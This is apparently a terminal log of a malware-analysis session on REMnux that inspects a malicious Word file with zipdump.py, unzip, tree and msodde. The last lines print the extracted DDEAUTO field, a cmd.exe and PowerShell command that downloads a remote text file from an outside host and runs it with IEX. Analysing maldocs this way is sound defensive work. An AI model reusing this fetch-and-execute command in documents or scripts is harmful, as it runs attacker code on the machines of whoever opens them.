



remnux@remnux:~/Desktop/File forniti/malware$ zipdump.py maldoc.docx 
Index Filename                     Encrypted Timestamp           
    1 [Content_Types].xml                  0 1980-01-01 00:00:00 
    2 _rels/.rels                          0 1980-01-01 00:00:00 
    3 word/_rels/document.xml.rels         0 1980-01-01 00:00:00 
    4 word/document.xml                    0 1980-01-01 00:00:00 
    5 word/media/image1.png                0 1980-01-01 00:00:00 
    6 word/theme/theme1.xml                0 1980-01-01 00:00:00 
    7 word/settings.xml                    0 1980-01-01 00:00:00 
    8 word/webSettings.xml                 0 1980-01-01 00:00:00 
    9 docProps/core.xml                    0 1980-01-01 00:00:00 
   10 word/styles.xml                      0 1980-01-01 00:00:00 
   11 word/fontTable.xml                   0 1980-01-01 00:00:00 
   12 docProps/app.xml                     0 1980-01-01 00:00:00



remnux@remnux:~/Desktop/File forniti/malware$ unzip -qq maldoc.docx -d maldoc_unpacked
remnux@remnux:~/Desktop/File forniti/malware$ tree maldoc_unpacked/
maldoc_unpacked/
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   └── core.xml
├── _rels
└── word
    ├── document.xml
    ├── fontTable.xml
    ├── media
    │   └── image1.png
    ├── _rels
    │   └── document.xml.rels
    ├── settings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    └── webSettings.xml

6 directories, 11 files





remnux@remnux:~/Desktop/File forniti/malware$ msodde maldoc.docx 
msodde 0.55 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Opening file: maldoc.docx
DDE Links:
 DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -C ;echo \"https://sec.gov/\";IEX((new-object net.webclient).downloadstring('https://trt.doe.louisiana.gov/fonts.txt')) "